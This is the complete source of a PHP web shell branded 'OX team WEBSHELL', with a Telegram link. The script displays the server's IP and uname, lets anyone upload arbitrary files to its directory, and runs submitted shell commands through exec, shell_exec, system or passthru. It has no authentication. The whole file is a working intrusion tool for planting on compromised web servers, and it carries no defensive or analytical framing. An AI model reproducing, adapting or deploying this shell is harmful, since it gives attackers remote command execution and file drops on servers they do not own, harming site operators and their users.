<?php
$output = '';
$uploadMessage = '';

$serverIP = $_SERVER['SERVER_ADDR'];
$clientIP = $_SERVER['REMOTE_ADDR'];
$uname = php_uname();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file'])) {
        $uploadDirectory = __DIR__ . '/';
        $filePath = $uploadDirectory . basename($_FILES['file']['name']);

        if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
            $uploadMessage = "File uploaded successfully: " . htmlspecialchars(basename($_FILES['file']['name']));
        } else {
            $uploadMessage = "File upload failed.";
        }
    }

    if (isset($_POST['command']) && isset($_POST['function'])) {
        $command = escapeshellcmd($_POST['command']);
        $function = $_POST['function'];

        switch ($function) {
            case 'exec':
                exec($command, $output);
                $output = implode("\n", $output);
                break;
            case 'shell_exec':
                $output = shell_exec($command);
                break;
            case 'system':
                ob_start();
                system($command);
                $output = ob_get_clean();
                break;
            case 'passthru':
                ob_start();
                passthru($command);
                $output = ob_get_clean();
                break;
            default:
                $output = 'Invalid function selected.';
                break;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OX team WEBSHELL</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            padding: 0;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: #111;
            color: #0f0;
            width: 100%;
        }
        .logo img {
            max-width: 300px;
        }
        .header p {
            margin: 5px 0;
        }
        .container {
            background-color: #111;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            text-align: center;
            margin-bottom: 20px;
            width: 80%;
            max-width: 400px; /* Narrower width for the container */
        }
        h1 {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="file"] {
            width: 90%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #0f0;
            border-radius: 5px;
            background-color: #222;
            color: #0f0;
        }
        .buttons {
            margin-bottom: 20px;
        }
        .buttons label {
            margin-right: 20px;
        }
        .output-container, .upload-message {
            max-height: 200px; /* Limit the height for the output container */
            overflow-y: auto; /* Enable vertical scrolling */
            background-color: #333;
            color: #0f0;
            padding: 20px;
            border-radius: 5px;
            text-align: left;
            white-space: pre-wrap;
        }
        button {
            background-color: #0f0;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0b0;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <a href="https://i.ibb.co/RbrW72w/ox.webp">
                <img src="https://i.ibb.co/RbrW72w/ox.webp" alt="OX Team Logo">
            </a>
        </div>
        <p><strong>OX TEAM SHELL</strong></p>
        <p><a href="https://t.me/opxsteam" style="color: #0f0;">telegram.me/opxsteam</a></p>
        <div>
            <p>Server Details</p>
            <p>IP: <?php echo $serverIP; ?></p>
            <p>uname: <?php echo $uname; ?></p>
            <p>Your IP: <?php echo $clientIP; ?></p>
        </div>
    </div>

    <div class="container">
        <h1>File Uploader</h1>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
        <?php if (!empty($uploadMessage)): ?>
            <div class="upload-message"><?php echo $uploadMessage; ?></div>
        <?php endif; ?>
    </div>

    <div class="container">
        <h1>Execute a Command</h1>
        <form method="post">
            <input type="text" name="command" placeholder="Enter your command" required>
            <div class="buttons">
                <label><input type="radio" name="function" value="exec" required> exec</label>
                <label><input type="radio" name="function" value="shell_exec"> shell_exec</label>
                <label><input type="radio" name="function" value="system"> system</label>
                <label><input type="radio" name="function" value="passthru"> passthru</label>
            </div>
            <button type="submit">Run</button>
        </form>
        <?php if (!empty($output)): ?>
            <div class="output-container"><?php echo htmlspecialchars($output); ?></div>
        <?php endif; ?>
    </div>
</body>
</html>
